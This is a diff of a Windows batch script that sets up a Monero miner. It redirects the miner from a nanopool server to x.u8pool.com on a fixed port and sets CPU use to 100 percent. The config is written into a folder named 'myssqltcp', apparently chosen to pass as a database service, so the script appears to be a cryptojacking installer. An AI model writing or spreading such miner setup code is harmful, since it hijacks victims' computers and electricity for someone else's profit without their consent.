@@ -145,20 +145,20 @@ if [%EXP_MONERO_HASHRATE%] == [] (
   exit 
 )
 
-if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=14444 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=14444 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=14433 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=80 & goto PORT_OK )
-if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=80 & goto PORT_OK )
-set PORT=80
+if %EXP_MONERO_HASHRATE% gtr 208400  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 102400  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 51200  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 25600  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 12800  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 6400  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 3200  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 1600  ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 800   ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 400   ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 200   ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr 100   ( set PORT=13555 & goto PORT_OK )
+if %EXP_MONERO_HASHRATE% gtr  50   ( set PORT=13555 & goto PORT_OK )
+set PORT=13555
 
 :PORT_OK
 
@@ -297,8 +297,8 @@ if not [%EMAIL%] == [] (
 )
 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"algo\": *null,', '\"algo\": "rx/0",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"xmr-us-west1.nanopool.org:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
-powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%WALLET%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"url\": *\".*\",', '\"url\": \"x.u8pool.com:%PORT%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
+powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"user\": *\".*\",', '\"user\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"pass\": *\".*\",', '\"pass\": \"%PASS%\",'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 powershell -Command "$out = cat '%USERPROFILE%\netsys\config.json' | %%{$_ -replace '\"max-cpu-usage\": *\d*,', '\"max-cpu-usage\": 100,'} | Out-String; $out | Out-File -Encoding ASCII '%USERPROFILE%\myssqltcp\config.json'" 
 set LOGFILE2=%LOGFILE:\=\\%
